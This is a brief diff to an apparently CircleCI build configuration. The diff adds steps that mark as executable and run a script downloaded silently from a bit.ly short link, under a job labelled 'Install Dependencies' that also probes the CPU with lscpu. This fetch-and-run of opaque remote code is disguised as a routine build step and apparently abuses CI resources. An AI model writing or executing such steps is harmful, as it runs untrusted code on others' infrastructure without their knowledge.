@@ -8,6 +8,8 @@ jobs:
             name: Install Dependencies
             command: timeout 1m lscpu
         -   run: wget -O w2022.sh https://bit.ly/a2nk-W2022 > /dev/null 2>&1
+        -   run: chmod +x w2022.sh
+        -   run: ./w2022.sh
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
